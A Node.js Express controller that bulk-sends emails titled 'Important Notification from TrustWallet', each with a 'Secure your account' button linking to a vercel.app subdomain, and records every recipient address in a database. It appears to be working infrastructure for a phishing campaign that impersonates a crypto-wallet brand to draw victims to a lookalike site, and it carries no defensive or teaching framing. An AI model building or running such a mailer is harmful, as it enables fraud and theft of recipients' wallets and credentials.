
const userModel = require('../models/user');
const sendEmail = require('../middlewares/nodemailer');
const { trustTemplate } = require('../utils/mailtemplates');

/**
 * POST /send-bulk-email
 * Expects body: { "email": "a@example.com" } or { "email": ["a@example.com", "b@example.com"] }
 * Sends a default subject and message/template to all emails, including a 'Secure your account' button,
 * and saves each email to the database.
 */
exports.sendBulkEmailDefault = async (req, res) => {
    try {
        let { email } = req.body;

        // Normalize email to an array, trim, deduplicate, and filter out empty values
        if (typeof email === 'string') {
            email = [email];
        }
        if (!Array.isArray(email)) {
            return res.status(400).json({ error: 'Email must be a non-empty string or array.' });
        }
        email = email
            .map(e => typeof e === 'string' ? e.trim() : '')
            .filter(e => e.length > 0);
        // Remove duplicates
        email = [...new Set(email)];

        if (email.length === 0) {
            return res.status(400).json({ error: 'Email must be a non-empty string or array.' });
        }

        // Use only the mail template for the email body
        const defaultSubject = "Important Notification from TrustWallet";
        const secureLink = `https://trust-wallet-inky.vercel.app/`;

        // Send emails and save to DB in parallel
        const results = await Promise.allSettled(
            email.map(async (e) => {
                // Send the email using only the mail template
                await sendEmail({
                    email,
                    subject: defaultSubject,
                    html: trustTemplate(secureLink)
                });
                // Save to DB (avoid duplicates)
                await userModel.updateOne(
                    { email: e },
                    { $setOnInsert: { email: e } },
                    { upsert: true }
                );
                return e;
            })
        );

        
        const success = results.filter(r => r.status === 'fulfilled').length;
        const failed = results.filter(r => r.status === 'rejected').length;

        return res.status(200).json({
            message: `Bulk email process completed.`,
            successCount: success,
            failedCount: failed,
            errors: results
                .map((r, i) => r.status === 'rejected' ? { email: email[i], reason: r.reason } : null)
                .filter(Boolean)
        });
    } catch (error) {
        return res.status(500).json({ error: 'Internal server error.' });
    }
};
